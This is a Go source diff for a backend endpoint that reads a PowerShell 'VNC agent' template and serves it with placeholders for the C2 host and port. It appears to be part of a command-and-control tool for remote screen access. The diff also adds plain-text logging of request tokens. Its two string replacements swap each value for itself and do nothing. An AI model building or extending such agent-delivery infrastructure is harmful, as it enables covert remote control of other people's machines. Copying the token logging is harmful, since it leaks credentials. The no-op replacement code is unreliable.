@@ -13,6 +13,7 @@ import (
 	"os"
 	"os/signal"
 	"runtime/debug"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
@@ -614,21 +615,43 @@ func main() {
 		})
 	}).Methods("GET", "OPTIONS")
 
-	// VNC generator endpoint
+	// VNC generator endpoint - ACTUALLY READ THE REAL vnc_agent_template.ps1
 	api.HandleFunc("/vnc/generate", func(w http.ResponseWriter, r *http.Request) {
 		log.Printf("VNC generator request: %s %s", r.Method, r.URL.Path)
+
+		// Read the REAL vnc_agent_template.ps1 file
+		scriptPath := "../frontend/src/utils/vnc_agent_template.ps1"
+		scriptContent, err := os.ReadFile(scriptPath)
+		if err != nil {
+			log.Printf("ERROR: Failed to read vnc_agent_template.ps1: %v", err)
+			http.Error(w, "Failed to read VNC agent template", http.StatusInternalServerError)
+			return
+		}
+
+		// Convert to string and replace placeholders with actual values
+		script := string(scriptContent)
+
+		// Replace the C2 server details with actual values
+		// These should match your backend configuration
+		script = strings.ReplaceAll(script, "$C2Host = \"localhost\"", "$C2Host = \"localhost\"")
+		script = strings.ReplaceAll(script, "$C2Port = 8080", "$C2Port = 8080")
+
+		log.Printf("VNC agent template loaded successfully, size: %d bytes", len(script))
 
 		w.Header().Set("Content-Type", "application/json")
 		w.WriteHeader(http.StatusOK)
 		json.NewEncoder(w).Encode(map[string]interface{}{
-			"script":  "powershell -Command \"Start-Process -FilePath 'vncviewer.exe' -ArgumentList '192.168.0.111:5900'\"",
-			"message": "VNC connection script generated",
+			"script":  script,
+			"message": "Real VNC agent script generated from vnc_agent_template.ps1",
+			"size":    len(script),
 		})
 	}).Methods("GET", "OPTIONS")
 
 	// VNC stream endpoint for Server-Sent Events - WORKING VERSION!
 	api.HandleFunc("/vnc/stream", func(w http.ResponseWriter, r *http.Request) {
 		log.Printf("VNC STREAM REQUEST - Setting up Server-Sent Events")
+		log.Printf("VNC STREAM: Query parameters: %v", r.URL.Query())
+		log.Printf("VNC STREAM: Token: %s", r.URL.Query().Get("token"))
 
 		// Set headers for Server-Sent Events
 		w.Header().Set("Content-Type", "text/event-stream")
@@ -646,6 +669,24 @@ func main() {
 		}
 
 		log.Printf("VNC stream started - service initialized, waiting for frames...")
+
+		// SEND A TEST FRAME IMMEDIATELY TO VERIFY THE ENDPOINT IS WORKING
+		log.Printf("VNC STREAM: Sending immediate test frame to verify endpoint")
+		testFrame := map[string]interface{}{
+			"frame_id":      "test_frame_immediate",
+			"timestamp":     time.Now().Unix(),
+			"width":         800,
+			"height":        600,
+			"size":          1000,
+			"connection_id": "test",
+			"image_data":    "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjYwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iODAwIiBoZWlnaHQ9IjYwMCIgZmlsbD0icmdiKDI1LDI1LDExMikiLz48L3N2Zz4=",
+		}
+		testJSON, _ := json.Marshal(testFrame)
+		fmt.Fprintf(w, "data: %s\n\n", testJSON)
+		if flusher, ok := w.(http.Flusher); ok {
+			flusher.Flush()
+		}
+		log.Printf("VNC STREAM: Test frame sent successfully")
 
 		// Start a goroutine to send REAL VNC frames
 		go func() {
